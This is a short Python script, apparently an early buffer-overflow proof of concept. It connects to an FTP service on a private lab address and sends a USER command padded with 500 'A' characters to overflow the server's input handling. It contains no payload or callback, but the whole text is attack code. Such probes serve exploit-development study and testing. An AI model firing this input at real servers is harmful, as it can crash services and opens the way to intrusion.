#!/usr/bin/python
import socket
import sys

junk = 'A'*500

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.129.128',21))
s.recv(1024)
s.send('USER '+junk+'\r\n')
